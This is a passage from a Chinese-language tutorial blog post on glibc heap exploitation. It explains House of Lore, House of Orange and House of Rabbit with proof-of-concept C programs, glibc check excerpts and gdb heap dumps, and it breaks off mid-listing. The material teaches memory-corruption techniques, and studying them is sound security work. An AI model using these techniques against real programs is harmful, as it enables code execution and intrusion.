class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">puts</span>(<span class="string">"Nice jump d00d"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with the small one during the free()\n"</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>, stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>需要注意的是：</strong></p><ul><li><p>1、<code>void *p5 = malloc(1000);</code> 是为了防止和 victim_chunk 之后和 top_chunk 合并。</p></li><li><p>2、<code>free((void*)victim)</code>，victim 会被放入到 unsort bin 中去，然后下一次分配的大小如果比它大，那么将从 top chunk 上分配相应大小，而该 chunk 会被取下 link 到相应的 bin 中。如果比它小 (相等则直接返回)，则从该 chunk 上切除相应大小，并返回相应 chunk，剩下的成为 last reminder chunk , 还是存在 unsorted bin 中。</p></li></ul><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><p>House of Orange 与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。由于这种利用方法在此前的 CTF 题目中没有出现过，因此之后出现的一系列衍生题目的利用方法我们称之为 House of Orange。</p><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是<strong>特殊之处在于题目中不存在 free 函数或其他释放堆块的函数</strong>。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>如前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>详细过程：假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求：</p><ul><li><p>伪造的 size 必须要对齐到内存页</p></li><li><p>size 要大于 MINSIZE(0x10)</p></li><li><p>size 要小于之后申请的 chunk size + MINSIZE(0x10)</p></li><li><p>size 的 prev inuse 位必须为 1</p></li></ul><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>这里给出了一个示例程序，程序模拟了一个溢出覆盖到 top chunk 的 size 域。我们试图把 size 改小从而实现 brk 扩展，并把原有的 top chunk 放入 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size; <span class="comment">// overwrite top chunk size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们把 top chunk 的 size 覆盖为 0x41。之后申请大于这个尺寸的堆块，即 0x60。 但是当我们执行这个示例时会发现，这个程序并不能利用成功，原因在于 assert 并没有被满足从而抛出了异常。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[#<span class="number">0</span>] <span class="number">0x7ffff7a42428</span> → Name: __GI_raise(sig=<span class="number">0x6</span>)</span><br><span class="line">[#<span class="number">1</span>] <span class="number">0x7ffff7a4402a</span> → Name: __GI_abort()</span><br><span class="line">[#<span class="number">2</span>] <span class="number">0x7ffff7a8a2e8</span> → Name: __malloc_assert(assertion=<span class="number">0x7ffff7b9e150</span> <span class="string">"(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)"</span>, file=<span class="number">0x7ffff7b9ab85</span> <span class="string">"malloc.c"</span>, <span class="built_in">line</span>=<span class="number">0x95a</span>, function=<span class="number">0x7ffff7b9e998</span> &lt;__func__<span class="number">.11509</span>&gt; <span class="string">"sysmalloc"</span>)</span><br><span class="line">[#<span class="number">3</span>] <span class="number">0x7ffff7a8e426</span> → Name: sysmalloc(nb=<span class="number">0x70</span>, av=<span class="number">0x7ffff7dd1b20</span> &lt;main_arena&gt;)</span><br></pre></td></tr></table></figure><p>我们回头来看一下 assert 的条件，可以发现之前列出的条目都被满足了除了第一条：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>伪造的size必须要对齐到内存页</span><br></pre></td></tr></table></figure><p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span> &lt;== top chunk</span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x1fe1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行分配之后我们可以观察到原来的堆经过了 brk 扩展：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原有的堆</span></span><br><span class="line"><span class="number">0x0000000000602000</span> <span class="number">0x0000000000623000</span> <span class="number">0x0000000000000000</span> rw- [heap]</span><br><span class="line"></span><br><span class="line"><span class="comment">//经过扩展的堆</span></span><br><span class="line"><span class="number">0x0000000000602000</span> <span class="number">0x0000000000646000</span> <span class="number">0x0000000000000000</span> rw- [heap]</span><br></pre></td></tr></table></figure><p>我们的申请被分配到 0x623010 的位置，同时原有的堆被置入 unsorted bin：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: <span class="attribute">fw</span>=0x602020, <span class="attribute">bk</span>=0x602020</span><br><span class="line"> →   Chunk(<span class="attribute">addr</span>=0x602030, <span class="attribute">size</span>=0x1fc0, <span class="attribute">flags</span>=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>因为 unsorted bin 中存在块，所以我们下次的分配会切割这个块：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"> malloc(0x60);</span><br><span class="line"> 0x602030</span><br><span class="line"></span><br><span class="line">[+] unsorted_bins[0]: <span class="attribute">fw</span>=0x602090, <span class="attribute">bk</span>=0x602090</span><br><span class="line"> →   Chunk(<span class="attribute">addr</span>=0x6020a0, <span class="attribute">size</span>=0x1f50, <span class="attribute">flags</span>=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>可以看到分配的内存是从 unsorted bin 中切割的，内存布局如下：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602030</span>:   <span class="number">0x00007ffff7dd2208</span>  <span class="number">0x00007ffff7dd2208</span> &lt;== 未被清零的unsorted bin链表</span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000602020</span>  <span class="number">0x0000000000602020</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000001f51</span> &lt;== 切割剩下的新unsorted bin</span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>其实 house of orange 的要点正在于此，之后的利用因为涉及到_IO_FILE 的知识，放到 IO_FILE 部分进行学习记录。</p><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><p>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。</p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>我们知道，fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备。</p><p>原作者<a href="https://github.com/shift-crops/House_of_Rabbit">POC</a></p><p>前提条件：</p><ul><li>1、可以修改 fastbin 的 fd 指针或 size</li><li>2、可以触发 malloc consolidate(merge top 或 malloc big chunk 等等)</li></ul><p>下面来看一下 POC：</p><p>POC 1: <code>modify the size of fastbin chunk</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602050</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line"><span class="comment">/* Heap layout</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">..... </span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">...... </span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x21 ('!')</span></span><br><span class="line"><span class="comment">0176| 0x6020b0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0184| 0x6020b8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">chunk1[<span class="number">-1</span>]=<span class="number">0xa1</span>; <span class="comment">//modify chunk1 size to be 0xa1</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>);  <span class="comment">//allocate a large chunk, trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*Chunk1 overlap with chunk2 now</span></span><br><span class="line"><span class="comment">gdb-peda$ telescope 0x602000 100</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0xa1 </span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0024| 0x602018 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0032| 0x602020 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">.....</span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0112| 0x602070 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0120| 0x602078 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">....</span></span><br><span class="line"><span class="comment">0152| 0x602098 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0xa0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x20 (' ')</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x0</span></span><br><span class="line"><span class="comment">(0x60)     fastbin[4]: 0x0</span></span><br><span class="line"><span class="comment">(0x70)     fastbin[5]: 0x0</span></span><br><span class="line"><span class="comment">(0x80)     fastbin[6]: 0x0</span></span><br><span class="line"><span class="comment">                  top: 0x603450 (size : 0x1fbb0) </span></span><br><span class="line"><span class="comment">       last_remainder: 0x0 (size : 0x0) </span></span><br><span class="line"><span class="comment">            unsortbin: 0x0</span></span><br><span class="line"><span class="comment">(0x050)  smallbin[ 3]: 0x602050</span></span><br><span class="line"><span class="comment">(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>POC 2: <code>modify FD pointer</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x602050</span></span><br><span class="line"></span><br><span class="line">chunk2[<span class="number">1</span>]=<span class="number">0x31</span>; <span class="comment">//fake chunk size 0x30</span></span><br><span class="line">chunk2[<span class="number">7</span>]=<span class="number">0x21</span>  <span class="comment">//fake chunk's next chunk</span></span><br><span class="line">chunk2[<span class="number">11</span>]=<span class="number">0x21</span> <span class="comment">//fake chunk's next chunk's next chuck</span></span><br><span class="line"><span class="comment">/* Heap laylout</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0x51 ('Q')</span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x111 </span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x31 ('1')</span></span><br><span class="line"><span class="comment">0112| 0x602070 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0144| 0x602090 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0152| 0x602098 --&gt; 0x21 ('!')</span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0176| 0x6020b0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0184| 0x6020b8 --&gt; 0x21 ('!')</span></span><br><span class="line"><span class="comment">0192| 0x6020c0 --&gt; 0x0 